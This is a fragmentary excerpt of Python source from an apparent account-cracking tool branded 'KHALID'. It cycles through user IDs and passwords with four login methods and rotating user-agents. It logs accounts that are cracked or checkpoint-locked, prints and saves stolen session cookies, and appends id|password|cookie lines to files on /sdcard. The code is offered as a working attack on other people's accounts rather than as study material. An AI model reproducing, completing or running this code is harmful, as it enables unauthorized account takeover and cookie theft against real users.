...
def method1(idf,pwv):
	...
	sys.stdout.write(f"\r  {BG}[{W}KHALID-M1{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
...
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
    ...
    'user-agent': ua}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'y' in cpx:
					print(f'\r\r  {BG}[{W}KHALID-CP{BG}]{E} {B}{idf} {W}|{E} {B}{pw}{W}')
					open('/sdcard/KHALID-FILE-CP.txt', 'a').write(idf+'|'+pw+'\n')
					akun.append(idf+' • '+pw)
					cp+=1
					break
				...
				print(f'\r\r  {BG}[{W}KHALID-OK{BG}]{E} {G}{idf} {W}|{E} {G}{pw}{W}')
				if 'y' in cokix:
					print(f'\r  {BG}[{W}COOKIES{BG}]{E} : {G}{kuki}{E}')
				if 'y' in apkx:
					cek_apk(session,kuki)
				open('/sdcard/KHALID-FILE-OK.txt', 'a').write(idf+'|'+pw+" |--------- "+kuki+'\n')
				break
			else:
				continue
...
def method2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}KHALID-M2{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def method3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}KHALID-M3{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def method4(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}KHALID-M4{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
